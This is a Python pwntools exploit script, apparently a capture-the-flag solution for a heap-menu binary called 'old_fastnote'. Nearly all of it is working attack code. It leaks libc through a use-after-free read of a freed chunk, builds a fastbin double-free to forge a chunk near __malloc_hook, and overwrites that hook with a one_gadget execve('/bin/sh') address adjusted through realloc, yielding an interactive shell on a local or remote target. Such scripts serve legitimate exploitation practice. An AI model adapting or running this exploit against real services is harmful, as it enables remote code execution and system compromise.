from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './old_fastnote'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'choice:', str(idx).encode())

def create(idx, sz, content):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Content: ', content)

def edit(idx, content):
    pass # not support

def show(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(3)
    sla(b'Index: ', str(idx).encode())

def exp():
    # leak libc
    [create(i, 0x80, b'leak') for i in range(2)]
    delete(0)
    show(0)
    addr_arena = u64(rl()[:-1].ljust(8, b'\x00')) - 88
    libc.address = addr_arena - 0x3c4b20
    log.success('libc: ' + hex(libc.address))

    create(0, 0x80, b'retake 0x80-byte chunk, remain the heap clear.')

    malloc_hook = libc.sym.__malloc_hook
    addr_fake_chk = malloc_hook - 0x23
    log.success(f'malloc_hook@{hex(malloc_hook)}')
    log.success(f'fake_chunk@{hex(addr_fake_chk)}')

    [create(i, 0x68, b'aaa') for i in range(3)]
    delete(0)
    delete(1)
    delete(0)

    # fastbin: A->B->A
    create(0, 0x68, p64(addr_fake_chk))
    [create(1, 0x68, b'/bin/sh') for i in range(2)]

    bpt()

    # 0xf1247 execve("/bin/sh", rsp+0x70, environ)
    # constraints:                                
    # [rsp+0x70] == NULL
    addr_ogg = libc.address + 0xf1247

    # use __libc_realloc to make stack layout satisfy the requirements
    realloc_to_adjust = libc.sym.__libc_realloc + 0x6
    create(2, 0x68, flat({0xb:[addr_ogg, realloc_to_adjust]}))
    
    # trigger one-gadeget by malloc
    opt(1)
    sla(b'Index: ', b'3')
    sla(b'Size: ', b'128')

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()